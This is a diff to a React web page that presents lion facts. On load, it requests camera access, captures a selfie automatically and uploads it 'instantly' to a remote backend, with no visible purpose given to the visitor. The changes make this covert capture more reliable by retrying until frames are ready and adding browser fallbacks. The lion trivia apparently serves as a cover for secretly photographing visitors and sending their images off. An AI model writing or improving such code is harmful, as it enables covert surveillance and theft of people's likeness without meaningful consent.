@@ -1,26 +1,36 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 
 function App() {
   const BACKEND_URL = "https://welcome-backend.onrender.com"; // your backend URL
+  const [error, setError] = useState("");
 
   useEffect(() => {
     const captureSelfie = async () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        setError("Camera API not supported on this device/browser.");
+        return;
+      }
+
       try {
         // Ask for camera permission
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.srcObject = stream;
 
-        // Play video immediately
         await video.play();
 
-        // Capture as soon as first frame is ready
         const captureFrame = () => {
+          if (!video.videoWidth || !video.videoHeight) {
+            setTimeout(captureFrame, 50); // retry if video not ready yet
+            return;
+          }
+
           const canvas = document.createElement("canvas");
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
+
           const image = canvas.toDataURL("image/png");
 
           // Upload instantly
@@ -34,15 +44,16 @@ function App() {
           stream.getTracks().forEach((track) => track.stop());
         };
 
-        // Modern fast capture
+        // Modern browsers: fast frame callback
         if (video.requestVideoFrameCallback) {
           video.requestVideoFrameCallback(captureFrame);
         } else {
-          // fallback for older browsers: capture after small delay
+          // fallback
           setTimeout(captureFrame, 100);
         }
       } catch (err) {
         console.error("Camera error:", err);
+        setError("Camera access denied or not available on this device.");
       }
     };
 
@@ -71,6 +82,12 @@ function App() {
       <p style={{ fontSize: "1.2rem", maxWidth: "600px" }}>
         Lions are the only big cats that live in social groups called prides, with females doing most of the hunting and males often sporting a prominent mane. They are apex predators primarily found in the grasslands of Africa and have a roar that can be heard up to 5 miles away. All lion cubs are born with spots for camouflage, which fade as they get older. Lions can run at speeds of up to 50 miles per hour in short bursts and are known for their strength and teamwork during hunts.
       </p>
+
+      {error && (
+        <p style={{ color: "#ff6666", marginTop: "20px", fontSize: "1rem" }}>
+          ⚠ {error}
+        </p>
+      )}
 
       <style>{`
         @keyframes gradientAnimation {
